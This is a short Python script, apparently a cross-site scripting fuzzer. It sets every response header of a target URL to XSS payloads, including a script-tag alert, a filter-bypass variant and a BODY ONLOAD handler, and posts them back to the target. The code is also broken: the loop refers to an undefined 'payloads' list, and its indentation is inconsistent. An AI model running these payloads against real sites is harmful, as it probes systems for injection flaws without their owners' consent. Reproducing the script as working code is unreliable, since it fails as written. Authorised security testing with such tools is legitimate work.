import requests
import sys
url = sys.argv[1]
payload = ['<script>alert(1);</script>', '<scrscriptipt>alert(1);</scrscriptipt>', '<BODY ONLOAD=alert(1)>']
headers ={}
r = requests.head(url)
for payload in payloads:
	for header in r.headers:
		headers[header] = payload	
	req = requests.post(url, headers=headers)
		